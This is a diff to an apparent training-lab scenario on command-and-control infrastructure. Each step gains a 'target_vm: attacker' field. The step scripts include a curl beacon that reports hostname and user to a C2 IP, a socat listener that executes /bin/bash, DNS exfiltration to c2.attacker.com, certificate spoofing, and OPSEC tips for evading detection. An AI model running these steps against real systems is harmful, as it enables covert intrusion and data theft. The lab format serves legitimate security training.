@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: C2 Listener
     field: stdout
+  target_vm: attacker
   script: 'nc -lvnp 4443 &>/tmp/c2_listener.log & echo "C2 Listener PID: $!" && sleep 1 && ss -tlnp | grep 4443'
   risk_level: medium
 - order: 2
@@ -38,6 +39,7 @@ steps:
     type: output_contains
     expect: Beacon script
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/beacon.sh << 'SHEOF'\n#!/bin/bash\n# C2 Beacon Simulator - Educational Purpose Only\nC2_SERVER=\"http://10.20.30.201:4443\"\nSLEEP_TIME=5\nJITTER=2\n\nwhile true; do\n    HOSTNAME=$(hostname)\n\
     \    USER=$(whoami)\n    IP=$(hostname -I | awk '{print $1}')\n    CHECKIN=\"beacon=$HOSTNAME&user=$USER&ip=$IP&time=$(date +%s)\"\n    curl -s -o /dev/null \"$C2_SERVER/api/checkin?$CHECKIN\" 2>/dev/null\n\
     \    ACTUAL_SLEEP=$((SLEEP_TIME + RANDOM % JITTER))\n    sleep $ACTUAL_SLEEP\ndone\nSHEOF\nchmod +x /tmp/beacon.sh && cat /tmp/beacon.sh && echo '' && echo 'Beacon script created (not executed)'"
@@ -55,6 +57,7 @@ steps:
     type: output_contains
     expect: C2 Redirector
     field: stdout
+  target_vm: attacker
   script: echo 'socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.20.30.201:4443 &' && echo '' && echo '=== C2 Redirector Architecture ===' && echo 'Victim -> Redirector (8443) -> C2 Server (4443)' && echo ''
     && echo 'Benefits:' && echo '1. C2 server IP not exposed to victims' && echo '2. Multiple redirectors for redundancy' && echo '3. Quick burn and replace if detected' && echo '4. Geographic distribution
     for evasion'
@@ -73,6 +76,7 @@ steps:
     type: output_contains
     expect: Domain Fronting
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Domain Fronting ===\n\n[Principle]\nTLS SNI: legitimate-cdn.com (seen by network monitor)\nHTTP Host: c2.attacker.com (processed by CDN backend)\n\n[Flow]\n1. Beacon connects to
     CDN IP (e.g., CloudFront)\n2. TLS handshake shows SNI = trusted-domain.com\n3. HTTP Host header = attacker-backend.com\n4. CDN routes to attacker backend\n5. Network monitor sees only CDN traffic\n\n[Detection]\n-
     Compare SNI vs Host header (requires TLS inspection)\n- Monitor for unusual CDN usage patterns\n- DNS analytics for CDN CNAME chains\n\n[Status]\n- Major CDNs (AWS, Azure, GCP) now block domain fronting\n-
@@ -94,6 +98,7 @@ steps:
     type: output_contains
     expect: Malleable C2 Profile
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/c2_profile.txt << 'EOF'\n=== Malleable C2 Profile (Google Safe Browsing Mimicry) ===\n\nhttp-get {\n    set uri \"/safebrowsing/rd/CltOb12nLW1IbHehYhg\";\n    client {\n        header\
     \ \"Accept\" \"text/html,*/*\";\n        header \"Accept-Language\" \"en-US\";\n        header \"Connection\" \"close\";\n        metadata {\n            base64url;\n            append \".class\";\n\
     \            parameter \"ct\";\n        }\n    }\n    server {\n        header \"Content-Type\" \"application/octet-stream\";\n        header \"Cache-Control\" \"public,max-age=172800\";\n        output\
@@ -114,6 +119,7 @@ steps:
     type: output_contains
     expect: DNS C2
     field: stdout
+  target_vm: attacker
   script: 'CMD_RESULT=$(hostname | base64 | tr -d ''=\n'') && echo "=== DNS C2 Communication ==='' && echo ''Encoded data: $CMD_RESULT" && echo '''' && echo ''Outbound (data exfil via subdomain):'' && echo
     "nslookup ${CMD_RESULT}.data.c2.attacker.com" && echo '''' && echo ''Inbound (command via TXT record):'' && nslookup -type=TXT version.bind 2>&1 | head -5 && echo '''' && echo ''Tools: dnscat2, iodine,
     dns2tcp, DNSTT'''
@@ -131,6 +137,7 @@ steps:
     type: output_contains
     expect: Encrypted C2
     field: stdout
+  target_vm: attacker
   script: openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2_key.pem -out /tmp/c2_cert.pem -days 365 -nodes -subj '/CN=microsoft.com/O=Microsoft Corporation' 2>&1 | tail -3 && echo '' && echo '=== Encrypted
     C2 Listener ===' && echo 'socat OPENSSL-LISTEN:443,cert=/tmp/c2_cert.pem,key=/tmp/c2_key.pem,verify=0,fork EXEC:/bin/bash' && echo '' && echo 'Certificate mimics legitimate organization' && echo 'Traffic
     appears as normal HTTPS' && openssl x509 -in /tmp/c2_cert.pem -noout -subject -issuer 2>/dev/null
@@ -149,6 +156,7 @@ steps:
     type: output_contains
     expect: OPSEC Checklist
     field: stdout
+  target_vm: attacker
   script: echo -e '=== C2 OPSEC Checklist ===\n\n[Infrastructure]\n- Separate staging/long-haul C2 servers\n- Use cloud VPS (different providers)\n- No link between C2 and personal identity\n\n[Network]\n-
     Domain categorization (reputation)\n- Aged domains (registered 6+ months ago)\n- SSL certificates from legitimate CAs\n- JA3 fingerprint matching common browsers\n\n[Communication]\n- Sleep time > 60s
     for long-haul\n- Jitter 20-50% for beacon randomization\n- Kill date for expired campaigns\n- Peer-to-peer for internal pivoting\n\n[Hosting]\n- Pay with cryptocurrency\n- Use VPN/Tor for management\n-
@@ -168,6 +176,7 @@ steps:
     type: output_contains
     expect: SMB Named Pipe
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== SMB Named Pipe C2 ===\n\n[Concept]\n- Uses SMB protocol (port 445) for C2 communication\n- Named pipes: \\\\server\\pipe\\pipename\n- Already allowed in most internal networks\n\n[Architecture]\n  Internet
     C2 <-HTTPS-> Pivot Host <-SMB Pipe-> Internal Hosts\n\n[Advantages]\n1. No new ports needed (445 already open internally)\n2. Blends with normal AD/SMB traffic\n3. No internet access needed for internal
     hosts\n4. Encrypted within SMB signing\n\n[Cobalt Strike Implementation]\n- Listener: windows/beacon_bind_pipe\n- Connect: link targethost pipenamem\n- P2P mesh: daisy-chain beacons\n\n[Detection]\n-
@@ -187,6 +196,7 @@ steps:
     type: output_contains
     expect: C2 Framework Comparison
     field: stdout
+  target_vm: attacker
   script: echo -e '=== C2 Framework Comparison ===\n\nFramework     | Protocol          | OS      | Detection | License\n------------- | ----------------- | ------- | --------- | --------\nCobalt Strike
     | HTTP/S,DNS,SMB    | Win     | Medium    | Commercial\nSliver        | HTTP/S,DNS,mTLS   | Multi   | Low       | Open Source\nHavoc         | HTTP/S            | Win     | Low       | Open Source\nMythic        |
     HTTP/S,WS,TCP     | Multi   | Medium    | Open Source\nBrute Ratel   | HTTP/S,DNS,SMB    | Win     | Low       | Commercial\nMerlin        | HTTP/2,HTTP/3     | Multi   | Low       | Open Source\nPoshC2        |
@@ -206,6 +216,7 @@ steps:
     type: output_contains
     expect: Process Injection
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Process Injection Techniques ===\n\n[1] CreateRemoteThread\n- Allocate memory in target process\n- Write shellcode to allocated memory\n- Create remote thread to execute\n- Detection:
     Sysmon Event ID 8\n\n[2] Process Hollowing (RunPE)\n- Create suspended process (e.g., svchost.exe)\n- Unmap legitimate code\n- Map malicious code at same base\n- Resume execution\n- Detection: Memory
     analysis, unmapped sections\n\n[3] APC Queue Injection\n- Queue Asynchronous Procedure Call\n- Executes when thread enters alertable state\n- Less suspicious than CreateRemoteThread\n\n[4] DLL Injection\n-
@@ -224,6 +235,7 @@ steps:
     type: output_contains
     expect: Beacon Timing
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Beacon Timing Analysis ==='' && for i in $(seq 1 10); do BASE=60; JITTER=$((RANDOM % 30)); ACTUAL=$((BASE + JITTER)); echo "Beacon $i: sleep ${ACTUAL}s (base:${BASE} + jitter:${JITTER})";
     done && echo '''' && echo ''Without jitter: 60,60,60,60,60 -> easily detected periodic pattern'' && echo ''With 50% jitter: 63,47,72,55,68 -> irregular, harder to detect'' && echo '''' && echo ''Recommended
     settings:'' && echo ''Short-haul (staging): 1-5s sleep, 0% jitter'' && echo ''Long-haul (persistent): 300-3600s sleep, 30-50% jitter'''
@@ -243,6 +255,7 @@ steps:
     type: output_contains
     expect: C2 Detection
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== C2 Detection Techniques ===\n\n[Network-Based]\n1. JA3/JA3S TLS Fingerprinting\n   - Hash of TLS ClientHello/ServerHello parameters\n   - Cobalt Strike default JA3: well-known signature\n2.
     Beacon Detection\n   - Rita/AC-Hunter: Periodic communication analysis\n   - Frequency analysis of connection intervals\n3. DNS Analytics\n   - Long subdomain queries (DNS tunneling)\n   - High entropy
     in DNS labels\n   - Unusual TXT record volume\n\n[Host-Based]\n4. Memory Scanning\n   - Beacon signatures in process memory\n   - Unbacked executable memory regions\n5. Named Pipe Monitoring\n   - Sysmon
@@ -261,6 +274,7 @@ steps:
     type: output_contains
     expect: C2 Teardown
     field: stdout
+  target_vm: attacker
   script: pkill -f 'nc -lvnp 4443' 2>/dev/null && echo 'Listener terminated' && rm -f /tmp/c2_*.pem /tmp/beacon.sh /tmp/c2_profile.txt /tmp/c2_listener.log && echo 'Temp files cleaned' && echo '' && echo
     '=== C2 Teardown Complete ===' && ss -tlnp | grep 4443 || echo 'Port 4443 released'
   risk_level: low
@@ -318,6 +332,7 @@ steps:
     type: output_contains
     expect: C2 Infrastructure Lab Report
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/c2_report.txt << ''EOF''
 
     === C2 Infrastructure Lab Report ===
